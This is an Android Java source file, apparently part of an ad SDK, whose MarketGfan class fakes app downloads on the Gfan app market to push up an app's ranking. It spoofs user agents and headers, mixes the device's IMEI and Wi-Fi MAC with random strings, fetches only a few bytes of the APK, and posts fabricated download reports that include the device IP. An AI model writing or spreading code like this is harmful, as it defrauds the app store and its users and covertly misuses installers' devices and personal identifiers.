package com.umeng.ad.app;

import java.io.InputStream;
import java.net.URLEncoder;
import java.util.List;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpParams;
import org.apache.http.params.HttpProtocolParams;
import org.apache.http.protocol.HTTP;
import org.json.JSONArray;
import org.w3c.dom.Document;
import org.w3c.dom.Element;

import android.content.Context;
import android.text.TextUtils;

import com.umeng.ad.app.utils.DocumentUtils;
import com.umeng.ad.app.utils.SAXReader;

class MarketGfan extends Market {

	private String gfanClientVersionName;
	private String gfanClientVersionCode;

	public MarketGfan() {
	}

	public MarketGfan(String packageName) {
		MARKET_NAME = MARKET_GFAN;
		setPackageName(packageName);
	}

	/**
	 * DeviceInfo
	 */
	private DeviceInfo deviceInfo;
	private String HEADER_G_Header = "";
	private String HEADER_Cookie = "";
	private String HEADER_Cookie2 = "$Version=1";

	/**
	 * URL
	 */
	private static final String GFAN_API_HOST = "http://api.gfan.com";
	private static final String ACTION_01_GET_HOMERECOMMEND = GFAN_API_HOST
			+ "/market/api/getHomeRecommend";
	private static final String ACTION_02_GET_HOTWORDS = "http://search.gfan.com/search/search/marketHotWords?q=%s";
	private static final String ACTION_03_SEARCH_APP = GFAN_API_HOST
			+ "/market/api/search";
	private static final String ACTION_04_APP_DETAIL = GFAN_API_HOST
			+ "/market/api/getProductDetail";
	private static final String ACTION_05_GET_DOWNLOAD_URL = GFAN_API_HOST
			+ "/market/api/getDownloadUrl";
	private static final String ACTION_07_DOWNLOAD_REPORT = GFAN_API_HOST
			+ "/market/api/downReport";

	/**
	 * AppInfo
	 */
	private String APP_KEYWORD;
	private String APP_PACKAGE;
	private String APP_PID;
	private String APP_SIZE;
	private String APP_DOWNLOAD_URL;
	private boolean do_search = false;

	@Override
	protected boolean prepareToRank(Context context) throws Exception {

		deviceInfo = new DeviceInfo(context);

		APP_KEYWORD = getAppKeyword();

		APP_PACKAGE = getPackageName();

		MLog.i("Keyword:" + APP_KEYWORD);

		// often reused headers
		HEADER_G_Header = String.format(
				"%1$s/%2$s/aMarket2.0/%3$s/%4$s/%5$s/%6$s/%7$s",
				deviceInfo.brand, deviceInfo.verName, gfanClientVersionName,
				gfanClientVersionCode, deviceInfo.imei,
				u.generateRandCharNum(20), deviceInfo.wifiMac);

		String userAgent = "Dalvik/1.6.0 (Linux; U; Android "
				+ deviceInfo.verName + "; " + deviceInfo.brand + " Build/"
				+ u.generateRandCharNum(6).toUpperCase() + ")";
		deviceInfo.setUserAgent(userAgent);

		/**
		 * Step1.GetHomeRecommend.
		 */
		this.action01GetHomeRecommend();

		/**
		 * Step2.GetMarketHotWord
		 */
		this.action02GetMarketHotWords();

		/**
		 * Step3.SearchApp
		 */
		int random = (int) (Math.random() * 100);
		if (TextUtils.isEmpty(APP_PID) || TextUtils.isEmpty(APP_SIZE)
				|| (random > 0 && random < 2)) {
			this.action03SearchApp();
		}
		
		if (do_search) {
			JSONArray keyArray = new JSONArray();
			keyArray.put("appId");
			keyArray.put("appSize");
			JSONArray valueArray = new JSONArray();
			valueArray.put(APP_PID);
			valueArray.put(APP_SIZE);
			super.updateMarketAppParams(context, keyArray, valueArray);
		}

		/**
		 * Step4.GetAppDetail
		 */
		this.action04AppDetail();

		/**
		 * Step5.GetDownloadUrl
		 */
		this.action05GetDownloadUrl();

		/**
		 * Step6.DownloadAPK
		 */

		this.action06DownloadAPK();

		

		/**
		 * Step7.DownloadReport
		 */
		return this.action07DownloadReport(context);
	}

	/**
	 * Get home recommend applications
	 * 
	 * @param proxy
	 */
	private void action01GetHomeRecommend() {
		try {
			System.out.println();
			MLog.d("GetHomeRecommend");

			// Request
			HttpPost httpPost = new HttpPost(ACTION_01_GET_HOMERECOMMEND);
			httpPost.addHeader("G-Header", HEADER_G_Header);
			String postBody = u.getInstance().getReqestContent(
					"gfan_home_recommend.xml");
			postBody = String.format(postBody, deviceInfo.verCode, deviceInfo
					.getScreenSize().replace("X", "#"));
			httpPost.setEntity(new StringEntity(postBody));
			MLog.i("post header:" + HEADER_G_Header);
			MLog.i("post body:" + postBody);

			// Client params
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();
			u.setParamsForHttpConnection(params);
			HttpProtocolParams.setUserAgent(params, "");
			client.setParams(params);
			//

			// Response
			HttpResponse response = client.execute(httpPost);
			int statusCode = response.getStatusLine().getStatusCode();
			MLog.i("status:" + statusCode);
			for (Header header : response.getAllHeaders()) {
				try {
					if ("Set-Cookie".equals(header.getName())) {
						HEADER_Cookie = header.getValue().split("\\;")[0];
						MLog.i(header.getName() + ":" + HEADER_Cookie);
					}
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
			String content = u
					.readContentFromHttpResponse(response, HTTP.UTF_8);
			// MLog.i("content:" + content);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * Get market hot words
	 * 
	 * @param proxy
	 */
	private void action02GetMarketHotWords() {
		try {
			System.out.println();
			MLog.d("GetMarketHotWords");
			String url = String.format(ACTION_02_GET_HOTWORDS,
					URLEncoder.encode(APP_KEYWORD, HTTP.UTF_8));
			MLog.i("" + url);

			// Request
			HttpGet httpGet = new HttpGet(url);

			// Client params
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();
			u.setParamsForHttpConnection(params);
			HttpProtocolParams.setUserAgent(params, "");
			client.setParams(params);

			// Response
			HttpResponse response = client.execute(httpGet);
			int statusCode = response.getStatusLine().getStatusCode();
			MLog.i("status:" + statusCode);
			String content = u
					.readContentFromHttpResponse(response, HTTP.UTF_8);
			// MLog.i("content:" + content);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * Search Application by keyword
	 * 
	 * @param proxy
	 */
	private void action03SearchApp() {
		do_search = true;
		try {
			System.out.println();
			MLog.d("SearchApp");

			// Request
			HttpPost httpPost = new HttpPost(ACTION_03_SEARCH_APP);
			httpPost.addHeader("G-Header", HEADER_G_Header);
			httpPost.addHeader("Cookie", HEADER_Cookie);
			httpPost.addHeader("Cookie2", HEADER_Cookie2);
			httpPost.addHeader("Content-Encoding", "gzip");
			String postBody = u.getInstance().getReqestContent(
					"gfan_search_app.xml");
			postBody = String.format(postBody, deviceInfo.verCode, APP_KEYWORD,
					deviceInfo.getScreenSize().replace("X", "#"));
			httpPost.setEntity(u.compressPostBodyWithGzip(postBody));
			MLog.i("post header:" + HEADER_G_Header);
			MLog.i("post body:" + postBody);

			// Client params
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();
			u.setParamsForHttpConnection(params);
			HttpProtocolParams.setUserAgent(params, "");
			client.setParams(params);

			// Response
			HttpResponse response = client.execute(httpPost);
			int statusCode = response.getStatusLine().getStatusCode();
			MLog.i("status:" + statusCode);
			// String content = u.readContentFromHttpResponse(response);
			// MLog.i("content:" + content);

			/**
			 * Get targetAppid
			 */
			this.actionAnalysisAppid(response.getEntity().getContent());
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * Get the target appid from search result
	 * 
	 * @param searchResultContent
	 */
	private void actionAnalysisAppid(InputStream searchResultContent) {
		try {
			System.out.println();
			MLog.d("AnalysisAppid for package " + APP_PACKAGE);
			SAXReader saxReader = new SAXReader();
			// MLog.i(searchResultContent+"");
			Document document = saxReader.read(searchResultContent);
			List<Element> packageNames = DocumentUtils.getInstance()
					.selectNodes(document, "/response/products/product");
			for (Element element : packageNames) {
				if (APP_PACKAGE.equals(element.getAttribute("packagename"))) {
					APP_PID = element.getAttribute("p_id");
					MLog.i("p_id:" + APP_PID + " downloadCount:"
							+ element.getAttribute("download_count"));
					APP_SIZE = element.getAttribute("app_size");
					break;
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * Get application detail from server
	 * 
	 * @param proxy
	 */
	private void action04AppDetail() {
		try {
			System.out.println();
			MLog.d("AppDetail");

			// Request
			HttpPost httpPost = new HttpPost(ACTION_04_APP_DETAIL);
			httpPost.addHeader("G-Header", HEADER_G_Header);
			httpPost.addHeader("Content-Type",
					"application/x-www-form-urlencoded");
			String postBody = u.getInstance().getReqestContent(
					"gfan_app_detail.xml");
			postBody = String.format(postBody, APP_PID);
			httpPost.setEntity(new StringEntity(postBody, HTTP.UTF_8));
			MLog.i("post header:" + HEADER_G_Header);
			MLog.i("post body:" + postBody);

			// Client params
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();
			u.setParamsForHttpConnection(params);
			HttpProtocolParams.setUserAgent(params, deviceInfo.getUserAgent());
			client.setParams(params);

			// Response
			HttpResponse response = client.execute(httpPost);
			int statusCode = response.getStatusLine().getStatusCode();
			MLog.i("status:" + statusCode);
			String content = u
					.readContentFromHttpResponse(response, HTTP.UTF_8);
			// MLog.i("content:" + content);

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void action05GetDownloadUrl() {
		try {
			System.out.println();
			MLog.d("GetDownloadUrl");

			// Request
			HttpPost httpPost = new HttpPost(ACTION_05_GET_DOWNLOAD_URL);
			httpPost.addHeader("G-Header", HEADER_G_Header);
			httpPost.addHeader("Content-Type",
					"application/x-www-form-urlencoded");
			String postBody = u.getInstance().getReqestContent(
					"gfan_download_url.xml");
			postBody = String.format(postBody, APP_PID);
			httpPost.setEntity(new StringEntity(postBody, HTTP.UTF_8));
			MLog.i("post header:" + HEADER_G_Header);
			MLog.i("post body:" + postBody);

			// Client params
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();
			u.setParamsForHttpConnection(params);
			HttpProtocolParams.setUserAgent(params, deviceInfo.getUserAgent());
			client.setParams(params);

			// Response
			HttpResponse response = client.execute(httpPost);
			int statusCode = response.getStatusLine().getStatusCode();
			MLog.i("status:" + statusCode);
			// String content = u.readContentFromHttpResponse(response);
			// MLog.i("content:" + content);

			/**
			 * GetdownloadUrl
			 */

			// u.writeContentToFile("temp.xml", content);
			this.actionAnalysisAppDownloadUrl(response.getEntity().getContent());
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * Get AppDownloadURL
	 * 
	 * @param downloadURLContent
	 */
	private void actionAnalysisAppDownloadUrl(InputStream downloadURLContent) {
		try {
			System.out.println();
			MLog.d("AnalysisAppDownloadUrl for package " + APP_PACKAGE);
			SAXReader saxReader = new SAXReader();
			Document document = saxReader.read(downloadURLContent);
			String node = DocumentUtils.getInstance().selectSingleNode(
					document, "/response/download_info/@url");
			MLog.i("url:" + node.trim());
			APP_DOWNLOAD_URL = node.trim();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * Download apk from server
	 * 
	 * @param proxy
	 */
	private void action06DownloadAPK() {
		try {
			System.out.println();
			MLog.d("DownloadAPK");

			// Request
			HttpGet httpGet = new HttpGet(APP_DOWNLOAD_URL);
			int range = ((int) (Math.random() * 300));
			MLog.i("range:" + range + "-" + (range + 2));
			httpGet.addHeader("Range", "bytes=" + range + "-" + (range + 2));

			// Client params
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();
			u.setParamsForHttpConnection(params);
			HttpProtocolParams.setUserAgent(params, "");
			client.setParams(params);
			
			// Response
			HttpResponse response = client.execute(httpGet);
			int statusCode = response.getStatusLine().getStatusCode();
			MLog.i("status:" + statusCode);
			String content = u
					.readContentFromHttpResponse(response, HTTP.UTF_8);
			// MLog.i("content:" + content);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * After downloading success, report data to server.
	 * 
	 * @param proxy
	 */
	private boolean action07DownloadReport(Context context) {
		try {
			System.out.println();
			MLog.d("DownloadReport");

			// Request
			HttpPost httpPost = new HttpPost(ACTION_07_DOWNLOAD_REPORT);
			httpPost.addHeader("G-Header", HEADER_G_Header);
			httpPost.addHeader("Cookie", HEADER_Cookie);
			httpPost.addHeader("Cookie2", HEADER_Cookie2);
			httpPost.addHeader("Content-Encoding", "gzip");
			String postBody = u.getInstance().getReqestContent(
					"gfan_download_report.xml");
			postBody = String.format(postBody, APP_PACKAGE,
					(1 + (int) (Math.random() * 4)), APP_PID, APP_DOWNLOAD_URL,
					APP_SIZE, u.getInstance().getIpAddress(context));
			httpPost.setEntity(u.compressPostBodyWithGzip(postBody));

			MLog.i("post header:" + HEADER_G_Header);
			MLog.i("post body:" + postBody);

			// Client params
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();
			u.setParamsForHttpConnection(params);
			HttpProtocolParams.setUserAgent(params, deviceInfo.getUserAgent());
			client.setParams(params);

			// Response
			HttpResponse response = client.execute(httpPost);
			int statusCode = response.getStatusLine().getStatusCode();
			MLog.i("status:" + statusCode);
			String content = u
					.readContentFromHttpResponse(response, HTTP.UTF_8);
			// MLog.i("content:" + content);

			if (statusCode == HttpStatus.SC_OK) {
				return true;
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}

	public String getGfanClientVersionName() {
		return gfanClientVersionName;
	}

	public void setGfanClientVersionName(String gfanClientVersionName) {
		this.gfanClientVersionName = gfanClientVersionName;
	}

	public String getGfanClientVersionCode() {
		return gfanClientVersionCode;
	}

	public void setGfanClientVersionCode(String gfanClientVersionCode) {
		this.gfanClientVersionCode = gfanClientVersionCode;
	}

	@Override
	protected void initAllParams() {
		try {
			setGfanClientVersionCode(params.get("m_gfanClientVersionCode"));
			setGfanClientVersionName(params.get("m_gfanClientVersionName"));
			setAPP_PID(params.get("a_appId"));
			setAPP_SIZE(params.get("a_appSize"));
		} catch (Exception e) {
		}

	}

	public String getAPP_PID() {
		return APP_PID;
	}

	public void setAPP_PID(String aPP_PID) {
		APP_PID = aPP_PID;
	}

	public String getAPP_SIZE() {
		return APP_SIZE;
	}

	public void setAPP_SIZE(String aPP_SIZE) {
		APP_SIZE = aPP_SIZE;
	}

}
